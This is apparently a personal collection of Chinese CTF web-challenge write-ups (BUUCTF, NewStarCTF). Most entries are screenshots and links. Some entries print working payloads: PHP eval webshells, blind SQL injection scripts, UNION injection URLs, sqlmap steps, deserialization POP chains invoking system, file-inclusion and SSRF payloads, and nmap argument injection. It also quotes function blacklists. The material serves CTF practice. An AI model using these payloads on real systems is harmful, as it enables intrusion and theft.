##  [极客大挑战 2019]EasySQL



![img](https://img-blog.csdnimg.cn/5faf1666a1f84b4b846f957b1ef308ac.png)

## [极客大挑战 2019]Havefun

![img](https://img-blog.csdnimg.cn/c9fe9602e3e74fdbaff46ab4a297d0fb.png)



![img](https://img-blog.csdnimg.cn/989a8870af704d70a0e39357527453e4.png)



![img](https://img-blog.csdnimg.cn/4b516b0be9da403eb88a5182419ec82d.png)




## [HCTF 2018]WarmUp

![img](https://img-blog.csdnimg.cn/e71cbab3fd7f407097bc612c543cb7fd.png)



![img](https://img-blog.csdnimg.cn/71ace45633fc4623b01f2b1e51780b66.png)



![img](https://img-blog.csdnimg.cn/297230e2d08b41f29194d8a78d6d8e60.png)



![img](https://img-blog.csdnimg.cn/a91221ea34d746c28d980f5056ec2b91.png)





## [ACTF2020 新生赛]Include

![img](https://img-blog.csdnimg.cn/acd95c32ac244f9bb54f88529be182ec.png)



![img](https://img-blog.csdnimg.cn/18a2d15e26be42ecb9487b02e185aa65.png)



![img](https://img-blog.csdnimg.cn/0d630a94c515462a85f4157dbd631cc4.png)





## [ACTF2020 新生赛]Exec

![img](https://img-blog.csdnimg.cn/cd420e074682438bb1413292321d7038.png)



![img](https://img-blog.csdnimg.cn/1e9f6959baad4e6fa3d716a5ba185f7e.png)



![img](https://img-blog.csdnimg.cn/3b1b4b337a2b4907a48ecbb114b934a7.png)



![img](https://img-blog.csdnimg.cn/1cae66ae7fa0414ca66865a5ab8dccde.png)





## [GXYCTF2019]Ping Ping Ping

![img](https://img-blog.csdnimg.cn/c9b5f9bba348492bb2b2dc25ab5e0e51.png)



![img](https://img-blog.csdnimg.cn/5b3cf2e6e0414639bd1c25f0f95510bf.png)



字符串拼接 

![img](https://img-blog.csdnimg.cn/71eb6848e5d246458d8c8d3fb467201b.png)



 反引号返回

![img](https://img-blog.csdnimg.cn/68cda51ee98a4a61b828f58a585369da.png)





##  [强网杯 2019]随便注

![img](https://img-blog.csdnimg.cn/0b31c1431eab48f09cfc897168ebd27d.png)





![img](https://img-blog.csdnimg.cn/4871bc38aaef4bfb982b902a7ead0be5.png)



![img](https://img-blog.csdnimg.cn/282722a72cd4424f91f14761b9a340d1.png)





## [SUCTF 2019]EasySQL

![img](https://img-blog.csdnimg.cn/c1c1c3026176475393bfa1ab2988f15d.png)



![img](https://img-blog.csdnimg.cn/366ad5b3d82a450d97eb88ea57a3b8be.png)



![img](https://img-blog.csdnimg.cn/555edd339b0e4f67aeacd2d5f66d40c8.png)



![img](https://img-blog.csdnimg.cn/fab5c7d7401f408088bae62f54c84fab.jpeg)





##  [极客大挑战 2019]Secret File

![img](https://img-blog.csdnimg.cn/5e8fd85ea4444535afb1d48bf555a159.png)



![img](https://img-blog.csdnimg.cn/6e2764154189481595a916cccc16c9ea.png)



![img](https://img-blog.csdnimg.cn/052132ba95ec42d1b080eb0d1f7fbecb.png)



![img](https://img-blog.csdnimg.cn/3d3a089eb2fa48be8c62fc9ec40d54a1.png)





## [极客大挑战 2019]LoveSQL

![img](https://img-blog.csdnimg.cn/82092051e51547cebaa8f7985b3b48df.png)



![img](https://img-blog.csdnimg.cn/e85daa80fa0d4d68a89532cb89f06e27.png)



![img](https://img-blog.csdnimg.cn/06e4ba28e3604eee8ca5f50093003c4d.png)



![img](https://img-blog.csdnimg.cn/0d1ac74b9e7c4c21992dde84b573750e.png)



![img](https://img-blog.csdnimg.cn/9d69b81de4224fdc95dd9e20e04ba75e.png)



![img](https://img-blog.csdnimg.cn/9df6aac0d61143b293e0496f716b97d7.png)



![img](https://img-blog.csdnimg.cn/d16344eccbb14b2c93046facdb41ad10.png)





## [极客大挑战 2019]Http

![img](https://img-blog.csdnimg.cn/0e2a9b62be4d4715b2ff7a8bf98aba51.png)



![img](https://img-blog.csdnimg.cn/a9cf01492c074f95bcd20b9d8e601032.png)



![img](https://img-blog.csdnimg.cn/ed1b67b8d9534cb3b34ca7f601565c42.png)



![img](https://img-blog.csdnimg.cn/1624ff090a62409cb6e51b0c6a41d2c3.png)



![img](https://img-blog.csdnimg.cn/379438ddecf84d37ba4144f446b631cd.png)





## [极客大挑战 2019]Knife

![img](https://img-blog.csdnimg.cn/2672471c084d4d93a5967908764084e3.png)



![img](https://img-blog.csdnimg.cn/f94188f0dd254f8aa1c817340443b8a0.png)



![img](https://img-blog.csdnimg.cn/bfd4e28853c246828afa78b28095c5d8.png)





## [极客大挑战 2019]Upload

![img](https://img-blog.csdnimg.cn/cc997a28faf14046b3f4b118fa7c8932.png)



![img](https://img-blog.csdnimg.cn/0b9b9963fb1b43bda52ae4c0a967c9f6.png)



![img](https://img-blog.csdnimg.cn/0777d9b6a8c646229913bbe306e9f192.png)





## [ACTF2020 新生赛]Upload

和上一题的思路差不多 一句话木马

![img](https://img-blog.csdnimg.cn/91ace6b8b4ba46579fde8c19b892ee46.png)





## [极客大挑战 2019]BabySQL



![img](https://img-blog.csdnimg.cn/ed481f4c077b49f9b11990d8d4d5d737.jpeg)



双写绕过 

![img](https://img-blog.csdnimg.cn/45b924a570a44c8fa87f90ea0041fe32.png)



![img](https://img-blog.csdnimg.cn/7bef1588a9fd4342921ff41f5cc1f22e.png)



测试字段数： 

![img](https://img-blog.csdnimg.cn/4b9bc386b6eb414495f450ee6f4cbdb8.png)



![img](https://img-blog.csdnimg.cn/421f4037ebe4471cb2735a1c061e598a.png)



数据库名： 

![img](https://img-blog.csdnimg.cn/6291fe6c729f4962b46f32b1bbc4089f.png)



表名： 

![img](https://img-blog.csdnimg.cn/95c5582e3a984d24b63d8079e57b4e2b.png)



 password：

![img](https://img-blog.csdnimg.cn/aee02a6ffbb745acb7709ba3ce9d72b0.png)



![img](https://img-blog.csdnimg.cn/e0c5ea08a4aa491c923b63ac38f12d96.png)





## [极客大挑战 2019]PHP

![img](https://img-blog.csdnimg.cn/b71df219820449c48571cb5417529e1f.png)



![img](https://img-blog.csdnimg.cn/a7e51c8dedcf4dc58c1c44ba74c13b1f.png)



 [[极客大挑战 2019\]PHP - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/366455343)



## [ACTF2020 新生赛]BackupFile 

![img](https://img-blog.csdnimg.cn/b4683b2ac5c24e1da0a356cc3eea4b40.png)



![img](https://img-blog.csdnimg.cn/ecb137e7e2294363877e6ca223af26ec.png)





## [RoarCTF 2019]Easy Calc

![img](https://img-blog.csdnimg.cn/8145c61af25a436597e00e7362999de3.png)



![img](https://img-blog.csdnimg.cn/19512ec830354f28a753c18be83d027d.png)



 [BUUCTF [RoarCTF 2019\]Easy Calc1_[roarctf 2019]easy calc 1_Fox_light的博客-CSDN博客](https://blog.csdn.net/lzu_lfl/article/details/126804008)



## [极客大挑战 2019]BuyFlag

![img](https://img-blog.csdnimg.cn/19104098f16e4c99b9cd88c0d05e7491.png)





## [BJDCTF2020]Easy MD5

![img](https://img-blog.csdnimg.cn/190db64416e240f69c6669029e93626b.png)



![img](https://img-blog.csdnimg.cn/ced4cd7ebda74aa499970a9261b41002.png)



![img](https://img-blog.csdnimg.cn/9311a794109d460c9d89e49131db5d12.png)



![img](https://img-blog.csdnimg.cn/623f673f780a42799b134e57ad3fada3.png)



![img](https://img-blog.csdnimg.cn/d78a377020654d84b808616776dc3d03.png)



 [upfine的博客 (cnblogs.com)](https://www.cnblogs.com/upfine/p/16470302.html)



## [护网杯 2018]easy_tornado

![img](https://img-blog.csdnimg.cn/688c595bc1c046daaf973b12741ba449.png)



![img](https://img-blog.csdnimg.cn/f30bc840a7564653b5c9e9f06ce8cd06.png)



![img](https://img-blog.csdnimg.cn/7b53bb30f81f46adafc9bdc20c141b3b.png)



![img](https://img-blog.csdnimg.cn/80442b00d0c7425a9570aee2ca7fe0b8.png)



[[护网杯 2018\]easy_tornado1_陈艺秋的博客-CSDN博客](https://blog.csdn.net/qq_49893996/article/details/131885110)



## [HCTF 2018]admin

### 

## [MRCTF2020]你传你🐎呢

![img](https://img-blog.csdnimg.cn/f47557a691dc4276804321b31acb6f29.png)



![img](https://img-blog.csdnimg.cn/89d394cc41a44073b05a47258b2b1ab5.png)



![img](https://img-blog.csdnimg.cn/e95bc1f9dba74878afdf87e07db4195e.png)





## [ZJCTF 2019]NiZhuanSiWei

![img](https://img-blog.csdnimg.cn/2f428166c3e440bc8c2bc3f256f55e8c.png)



 [[ZJCTF 2019\]NiZhuanSiWei_borrrrring的博客-CSDN博客](https://blog.csdn.net/borrrrring/article/details/117546772)



## [极客大挑战 2019]HardSQL

### 

## [MRCTF2020]Ez_bypass

![img](https://img-blog.csdnimg.cn/cfd5fee641e74d99a811ac4a43f3eed8.png)



![img](https://img-blog.csdnimg.cn/24faa22ebd6b4d3ca1778d0643c1babd.png)





##  [网鼎杯 2020 青龙组]AreUSerialz

```php
<?php
class FileHandler{
    public $op=2;
    public $filename="flag.php";
    public $content="12345";
}
$flag=new FileHandler;
print(serialize($flag));
?>
```



![img](https://img-blog.csdnimg.cn/487c91536f754391abe18f780d3c632e.png)



![img](https://img-blog.csdnimg.cn/2628bbef491a447495b6285ff482cbcb.png)





## [SUCTF 2019]CheckIn

![img](https://img-blog.csdnimg.cn/cd7649149ceb470da1aae87a79356c63.png)



![img](https://img-blog.csdnimg.cn/9d4b27444fb147ff8c7fdc1a6e3e73d0.png)



![img](https://img-blog.csdnimg.cn/30972a734680467586d088ad5370d6c6.png)



上传.user.ini配置文件使一句话木马可以连接 

```php
GIF89a
<script language="php"> eval($_REQUEST[123])</script>
```





## [GXYCTF2019]BabyUpload

与上一题基本一样，加上了[MRCTF2020]你传你🐎呢题中.htaccess配置文件的上传。



## [GXYCTF2019]BabySQli

[[GXYCTF2019\]BabySQli 1_林本的博客-CSDN博客](https://blog.csdn.net/qq_43618536/article/details/125577754)



## [GYCTF2020]Blacklist

堆叠注入：[[GYCTF2020\]Blacklist 1 - WeQi_Blog - 博客园 (cnblogs.com)](https://www.cnblogs.com/WeQi-Blog/p/15467473.html)

[堆叠注入tips - MustaphaMond - 博客园 (cnblogs.com)](https://www.cnblogs.com/20175211lyz/p/12356678.html)



## [CISCN2019 华北赛区 Day2 Web1]Hack World

```cpp
import requests
import string
import time

timeout = None

def bool_blind(url, flag_length):

    flag = ''
    strings = string.printable

    for i in range(1, flag_length + 1):
        current_char = None

        for j in strings:
            time.sleep(0.1)
            payload = f"(SELECT CASE WHEN SUBSTRING(flag, {i}, 1) = '{j}' THEN 1 ELSE 0 END FROM flag)"
            post_data = {'id': payload}
            r = requests.post(url, data=post_data)

            if 'Hello' in r.text:
                current_char = j
                break

        if current_char:
            flag += current_char
            print(f"Flag so far: {flag}")

    print(f"Final flag: {flag}")

url = "http://570e3c3b-f976-46d0-9ac6-d7988a58dc08.node4.buuoj.cn:81/index.php"
flag_length = 30  # 修改为实际的 flag 长度
bool_blind(url, flag_length)
```





## [网鼎杯 2018]Fakebook

## [RoarCTF 2019]Easy Java

![img](https://img-blog.csdnimg.cn/115d8799ac5a4c0cb5a5b5ee10ef19ea.png)



![img](https://img-blog.csdnimg.cn/de6439fbb57841efadbed8475990dcbb.png)



![img](https://img-blog.csdnimg.cn/20f99c0d04174f6cba96927cf819ce66.png)



![img](https://img-blog.csdnimg.cn/477224b1bec84ed096851c4f2d41126a.png)





## [BJDCTF2020]The mystery of ip

![img](https://img-blog.csdnimg.cn/6d7e5deda7574160a99bbafebe197723.png)



ip ->修改X-Forwarded-For: 



## [NewStarCTF 2023 week1] Begin of PHP

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

if(isset($_GET['key1']) && isset($_GET['key2'])){
    echo "=Level 1=<br>";
    if($_GET['key1'] !== $_GET['key2'] && md5($_GET['key1']) == md5($_GET['key2'])){
        $flag1 = True;
    }else{
        die("nope,this is level 1");
    }
}

if($flag1){
    echo "=Level 2=<br>";
    if(isset($_POST['key3'])){
        if(md5($_POST['key3']) === sha1($_POST['key3'])){
            $flag2 = True;
        }
    }else{
        die("nope,this is level 2");
    }
}

if($flag2){
    echo "=Level 3=<br>";
    if(isset($_GET['key4'])){
        if(strcmp($_GET['key4'],file_get_contents("/flag")) == 0){
            $flag3 = True;
        }else{
            die("nope,this is level 3");
        }
    }
}

if($flag3){
    echo "=Level 4=<br>";
    if(isset($_GET['key5'])){
        if(!is_numeric($_GET['key5']) && $_GET['key5'] > 2023){
            $flag4 = True;
        }else{
            die("nope,this is level 4");
        }
    }
}

if($flag4){
    echo "=Level 5=<br>";
    extract($_POST);
    foreach($_POST as $var){
        if(preg_match("/[a-zA-Z0-9]/",$var)){
            die("nope,this is level 5");
        }
    }
    if($flag5){
        echo file_get_contents("/flag");
    }else{
        die("nope,this is level 5");
    }
}
```



![img](https://img-blog.csdnimg.cn/a674025b777e44f2bb57342c4962d349.png)





## [NewStarCTF 2023 week1] R!C!E! 

```php
<?php
highlight_file(__FILE__);
if(isset($_POST['password'])&&isset($_POST['e_v.a.l'])){
    $password=md5($_POST['password']);
    $code=$_POST['e_v.a.l'];
    if(substr($password,0,6)==="c4d038"){
        if(!preg_match("/flag|system|pass|cat|ls/i",$code)){
            eval($code);
        }
    }
}
```



![img](https://img-blog.csdnimg.cn/d08916e9864b41b49c3de4cecd1f658d.png)



## [NewStarCTF 2023 week2] include 0。0

```php
<?php
highlight_file(__FILE__);
// FLAG in the flag.php
$file = $_GET['file'];
if(isset($file) && !preg_match('/base|rot/i',$file)){
    @include($file);
}else{
    die("nope");
}
```



参考[[CTF/网络安全\] 攻防世界 文件包含（泰山杯）解题详析_泰山杯ctf_秋说的博客-CSDN博客](https://blog.csdn.net/2301_77485708/article/details/132031713)

> [3cf7a2e0-b527-4859-9b34-01eda76a197d.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php](http://3cf7a2e0-b527-4859-9b34-01eda76a197d.node4.buuoj.cn:81/?file=php://filter/read=convert.base64-encode/resource=flag.php)

![img](https://img-blog.csdnimg.cn/8420298a68a642a391daeb70cffbb92b.png)





## [NewStarCTF 2023 week2] Unserialize？ 

![img](https://img-blog.csdnimg.cn/41cec9bae8a246feb77a36e1ed5dc815.png)





```php
<?php
class evil {
    public $cmd;
}

$flag =new evil();
$flag->cmd="ca''t ../../../th1s_1s_ffff''lllll4444aaaggggg";
print(serialize($flag));
?> 
```



## [NewStarCTF 2023 week2] ez_sql

1.查列数

> http://87d40cb2-b889-4650-8c23-320333964b20.node4.buuoj.cn:81/?id=TMP0919' UNION SELECT 1,2,3,4,5;--++

2.用database() 查出数据库名ctf

> [http://87d40cb2-b889-4650-8c23-320333964b20.node4.buuoj.cn:81/?id=TMP0919%27%20UNION%20SELECT%201,database(),3,4,5%20limit%201,2;--++](http://87d40cb2-b889-4650-8c23-320333964b20.node4.buuoj.cn:81/?id=TMP0919' UNION SELECT 1,database(),3,4,5 limit 1,2;--++)

\3. 对于数据库ctf，查出数据库表的数量

**写了一半改用sqlmap半自动化注入了**

> 1判断注入点
>
> sqlmap -u "http://172.16.1.116/?id=1" --batch
>  2获取数据库名
>
> sqlmap -u "http://172.16.1.116/?id=1" --batch --dbs
>  3获取指定数据库下所有表名
>
> sqlmap -u "http://172.16.1.116/?id=1" --batch -D 数据库名 --tables
>  4获取表中字段名
>
> sqlmap -u "http://172.16.1.116/?id=1" --batch -D 数据库名 -T 表名 --column
>  5获取数据
>
> sqlmap -u "http://172.16.1.116/?id=1" --batch -D 数据库名 -T 表名 -C 字段1,字段2…… --dmup



## [GWCTF 2019]我有一个数据库 

![img](https://img-blog.csdnimg.cn/2751d86183084af992ac64a80c80906c.png)





## [NewStarCTF 2023 week2] R!!C!!E!!

信息泄露的思路方向：

1、robots.txt

2、phpinfo.php

3、网站备份文件

4、源码泄露，常见的有：HG泄露；[git](https://so.csdn.net/so/search?q=git&spm=1001.2101.3001.7020)泄露；DS_Store泄露

> dirsearch -u http://9bc77c26-eb16-4131-9ae9-22242574bf2c.node4.buuoj.cn:81/

 扫描网站目录(git泄露)

> python2 GitHack.py http://9bc77c26-eb16-4131-9ae9-22242574bf2c.node4.buuoj.cn:81/.git

![img](https://img-blog.csdnimg.cn/ff1f0b838889424d812b5b996eeac09a.png)



![img](https://img-blog.csdnimg.cn/449c0217410643afb1d5a17502102f5b.png)



```php
<?php
highlight_file(__FILE__);
if (';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['star'])) {
    if(!preg_match('/high|get_defined_vars|scandir|var_dump|read|file|php|curent|end/i',$_GET['star'])){
        eval($_GET['star']);
    }
}
```



 无参rce

> GET /bo0g1pop.php?star=eval(pos(array_reverse(getallheaders()))); HTTP/1.1
>  Host: 33cdfd6e-b9e5-4b7e-b9c8-137432315e44.node4.buuoj.cn:81
>  Content-Length: 0
>  X-Forwarder-Proto:system('cat /flag');
>  Upgrade-Insecure-Requests: 1
>  User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
>  Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
>  Accept-Encoding: gzip, deflate
>  Accept-Language: zh-CN,zh;q=0.9
>  Connection: close

![img](https://img-blog.csdnimg.cn/04778286d3c843c59c300c96c462adb3.png)





## [NewStarCTF 2023 week3] Include 🍐

```php
<?php
    error_reporting(0);
    if(isset($_GET['file'])) {
        $file = $_GET['file'];
        
        if(preg_match('/flag|log|session|filter|input|data/i', $file)) {
            die('hacker!');
        }
        
        include($file.".php");
        # Something in phpinfo.php!
    }
    else {
        highlight_file(__FILE__);
    }
?>
```



![img](https://img-blog.csdnimg.cn/f9cc5bae44b845adb0d52988c18a273e.png)





 [浅谈文件包含之包含pearcmd.php漏洞-CSDN博客](https://blog.csdn.net/JCPS_Y/article/details/127541665)

```php
GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd&/<?=@eval($_POST[1])?>+/tmp/hello.php HTTP/1.1
Host: a960c469-0216-4a7a-9421-99c70c27ffb7.node4.buuoj.cn:81
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
```



```php
http://a960c469-0216-4a7a-9421-99c70c27ffb7.node4.buuoj.cn:81/index.php?file=/tmp/hello
```



![img](https://img-blog.csdnimg.cn/2d7be49a0a9e4eb1a02c19a1e3c67ee7.png)



![img](https://img-blog.csdnimg.cn/c40cba1fe877400ead6ed56281e80337.png)



## [BSidesCF 2020]Had a bad day 

![img](https://img-blog.csdnimg.cn/09c4a415c33a450bad006ead6cadecd8.png)



```
http://d7aba0d9-5c5b-40c0-909b-4dfa352701ed.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/resource=index.php
```



![img](https://img-blog.csdnimg.cn/a06e013cee6f43f68c11d36eb351f959.png)



去掉一个php得到：

```php
<?php
				$file = $_GET['category'];

				if(isset($file))
				{
					if( strpos( $file, "woofers" ) !==  false || strpos( $file, "meowers" ) !==  false || strpos( $file, "index")){
						include ($file . '.php');
					}
					else{
						echo "Sorry, we currently only support woofers and meowers.";
					}
				}
				?>
```



 构造的url中伪协议的参数部分包含woofers meowers index任意一个

构造：得到flag

```php
http://d7aba0d9-5c5b-40c0-909b-4dfa352701ed.node4.buuoj.cn:81/index.php?category=php://filter/read=convert.base64-encode/index/resource=flag
```



![img](https://img-blog.csdnimg.cn/f20b832927ac4c4193fc58a90ab90b95.png)




## [BSidesCF 2019]Kookie

![img](https://img-blog.csdnimg.cn/6f4392031ef34f94b8b48e442a149f84.png)





## [NewStarCTF 2023 week3] POP Gadget 

```php
<?php
highlight_file(__FILE__);

class Begin{
    public $name;

    public function __destruct()
    {
        if(preg_match("/[a-zA-Z0-9]/",$this->name)){
            echo "Hello";
        }else{
            echo "Welcome to NewStarCTF 2023!";
        }
    }
}

class Then{
    private $func;

    public function __toString()
    {
        ($this->func)();
        return "Good Job!";
    }

}

class Handle{
    protected $obj;

    public function __call($func, $vars)
    {
        $this->obj->end();
    }

}

class Super{
    protected $obj;
    public function __invoke()
    {
        $this->obj->getStr();
    }

    public function end()
    {
        die("==GAME OVER==");
    }
}

class CTF{
    public $handle;

    public function end()
    {
        unset($this->handle->log);
    }

}

class WhiteGod{
    public $func;
    public $var;

    public function __unset($var)
    {
        ($this->func)($this->var);    
    }
}

@unserialize($_POST['pop']);
```



 把截断符换成%00

![img](https://img-blog.csdnimg.cn/03a512b50d564df1b3e3ea62c4482ea9.png)



![img](https://img-blog.csdnimg.cn/937dd5195b9f455ba994b401357cfb10.png)



```php
<?php

class Begin{
    public $name;
}

class Then{
    private $func;
    public function setPrivate($a)
    {
        $this->func=$a;
    }
}

class Handle{
    protected $obj;
    public function setPrivate($a)
    {
        $this->obj=$a;
    }
}

class Super{
    protected $obj;
    public function setPrivate($a)
    {
        $this->obj=$a;
    }
}

class CTF{
    public $handle;
}

class WhiteGod{
    public $func='system';
    public $var='cat ../../../flag';

    
}
$flag=new Begin();
$A=new Then();
$B=new Handle();
$C=new Super();
$D=new CTF();
$E=new WhiteGod();
$D->handle=$E;
$B->setPrivate($D);
$C->setPrivate($B);
$A->setPrivate($C);
$flag->name=$A;


echo serialize($flag);
?>
```





## [NewStarCTF 2023 week3] medium_sql

 布尔盲注

```cpp
url = "http://da0d4c93-63d3-44fa-ac03-c1dee22a3944.node4.buuoj.cn:81"
n = 1
#数据库:ctf
#表名:gradas,here_is_flag
#字段名:flag
flag=''
for i in range(1,43):
    low=31
    high=127
    while low<=high:
        mid=(low+high)//2
        paylord_database="?id=TMP0919' And ASCII(SUBSTR((SELECT GROUP_CONCAT(flag) FROM here_is_flag),{},1))>{} --+".format(i,mid)
        response=requests.get(url+paylord_database)
        if("TMP0919" in response.text):
            low=mid+1
        else:
            high=mid-1
        result=(low+high+1)//2
        if(result==127 or result==31):
            break
    flag+=chr(result)
    print(flag)
    time.sleep(0.1)
```





## [网鼎杯 2018]Fakebook

> 1，注册一个用户，发现username处的内容是个url，查看一下。
>
> 2，查看url,发现存在SQL注入。
>
> ?n=1 order by 4# 正常回显
>
> ?n=1 order by 5# 回显异常（判断存在4个字段）
>
> 3，构造SQL语句，发现union select被过滤
>
> 使用union/**/select(或unoin all select)可绕过
>
> 
>
> ?no=-1 union/**/select 1,database(),3,4# （查数据库） 发现 'fakebook'
>
> 
>
> ?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema='fakebook'# （查表名） 发现'users'
>
> 
>
> ?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'#  (查字段)  字段名'no,username,data'
>
> 
>
> ?no=-1 union/**/select 1,data,3,4 from users# 查询data的结果
>
> O:8:"UserInfo":3:{s:4:"name";s:6:"adminn";s:3:"age";i:1;s:4:"blog";s:70:"http://fdc6f852-9cb6-462d-b6d5-bda01fe3d3d9.node4.buuoj.cn:81/join.php";}

![img](https://img-blog.csdnimg.cn/4023fc4438034014a475fe26f32603fb.png)





考察代码审计: 这是对blog进行过滤的正则，可以看到过滤的十分严格，直接限制死了只能是http(s): //格式，所以在注册的的是侯操作是不太可能的。

```php
public function isValidBlog ()
    {
        $blog = $this->blog;
        return preg_match("/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i", $blog);
    }
```



```php
function get($url)
    {
        $ch = curl_init();//创建一个curl资源

        curl_setopt($ch, CURLOPT_URL, $url); //设置url和响应选项
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        $output = curl_exec($ch); //抓取url并把它返回给浏览器
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE); //得到最后一个收到的HTTP状态码
        if($httpCode == 404) {
            return 404;
        }
        curl_close($ch); //关闭curl，并释放资源

        return $output;
    }

    public function getBlogContents ()
    {
        return $this->get($this->blog); //传参blog到get()
    }
```



直接把blog当作参数传给get()函数，url没有经过任何限制，是存在ssrf的。这个地方可以使用file:///var/www/html/flag.php读取flag.php，构造payload

> 　　?no=-1 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:18;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'

6，查看网页源代码，发现内联表单中嵌入base64加密的信息，进行解密得到flag。



## [网鼎杯 2020 朱雀组]phpweb

 bp抓包修改 查看index.php源代码

> func=file_get_contents&p=index.php

```php
<?php
    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
    function gettime($func, $p) {
        $result = call_user_func($func, $p);
        $a= gettype($result);
        if ($a == "string") {
            return $result;
        } else {return "";}
    }
    class Test {
        var $p = "Y-m-d h:i:s a";
        var $func = "date";
        function __destruct() {
            if ($this->func != "") {
                echo gettime($this->func, $this->p);
            }
        }
    }
    $func = $_REQUEST["func"];
    $p = $_REQUEST["p"];

    if ($func != null) {
        $func = strtolower($func);
        if (!in_array($func,$disable_fun)) {
            echo gettime($func, $p);
        }else {
            die("Hacker...");
        }
    }
    ?>
```



>  \ 绕过in_array()
>
> func=\system&p=cat $(find / -name flag*)
>
> 或者
>
> func=\exec&p=cat $(find / -name flag*)

> 反序列化
>
> func=unserialize&p=O:4:"Test":2:{s:1:"p";s:18:"find / -name flag*";s:4:"func";s:6:"system";}
>
> 然后进行cat 命令抓取flag
>
> func=unserialize&p=O:4:"Test":2:{s:1:"p";s:22:"cat /tmp/flagoefiu4r93";s:4:"func";s:6:"system";}
>
>  或者readfile读取flag文件
>
> func=readfile&p=/tmp/flagoefiu4r93
>
> 
>
> 或者类似exp的payload
>
> func=unserialize&p=O:4:"Test":2:{s:1:"p";s:25:"cat $(find / -name flag*)";s:4:"func";s:6:"system";}

## 

## [BUUCTF 2018]Online Tool

源码：

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}

if(!isset($_GET['host'])) {
    highlight_file(__FILE__);
} else {
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    $host = escapeshellcmd($host);
    $sandbox = md5("glzjin". $_SERVER['REMOTE_ADDR']);
    echo 'you are in sandbox '.$sandbox;
    @mkdir($sandbox);
    chdir($sandbox);
    echo system("nmap -T5 -sT -Pn --host-timeout 2 -F ".$host);
}
```



本地测试：

```php
<?php

if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $_SERVER['REMOTE_ADDR'] = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
    $host = $_GET['host'];
    $host = escapeshellarg($host);
    echo $host."<br>";
    $host = escapeshellcmd($host);
    echo $host."<br>";
    highlight_file(__FILE__);
```



> Escapeshellarg()函数把字符串转码成可以在shell命令里使用的参数，将单引号进行转义，转义之后，再在左右加单引号。
>  Escapeshellcmd()函数对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义,即将&#;`|*?~<>^()[]{}$\, \x0A和\xFF以及不配对的单/双引号转义。

![img](https://img-blog.csdnimg.cn/0678913df3ee412ab99b3a7393df9027.png)



 payload:

```php
host=' <?php @eval($_POST["hack"]);?> -oG hack.php '
```



```php
http://9fc4eff7-b643-407c-8d36-9264a2031c04.node4.buuoj.cn:81/?host=%27%20%3C?php%20@eval($_POST[%22hack%22]);?%3E%20-oG%20hack.php%20%27
```



```php
http://9fc4eff7-b643-407c-8d36-9264a2031c04.node4.buuoj.cn:81/a443996fcc9701a67983355732d1cf07/hack.php
```



 [PHP: escapeshellcmd - Manual](https://www.php.net/manual/zh/function.escapeshellcmd.php)

1.escapeshellarg()将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含exec(),system()执行运算符。

2.escapeshellcmd()对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转义。反斜线（\）会在以下字符之前插入：&#;`|*?~<>^()[]{}$,\x0A和\xFF。'和"仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及%和!字符都会被空格代替。

例子：来自seebug
 1.传入的参数是：172.17.0.2’ -v -d a=1

2.经过escapeshellarg处理后变成了’172.17.0.2’’’ -v -d a=1’，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。

```php
 '172.17.0.2'     \'      ' -v -d a=1'
 三部分，中间的就是我们原来加的那个'（作用我们在下面会体现出来），
 然后用单引号括起来。
```

![点击并拖拽以移动](data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==)

3.经过escapeshellcmd处理后变成’172.17.0.2’\’’ -v -d a=1’，这是因为escapeshellcmd对\以及最后那个不配对儿的引号进行了转义

```php
'172.17.0.2'     \\     ''      -v -d a=1\'
四部分，第二部分的\（也就是上面我们所加的单引号被escapeshellarg转义所多出来）
被转义变为\\,那么在最后执行的时候会解释为\,然后上面我们加的那个'会和后面一个'组合为
一个空字符也就是''
```



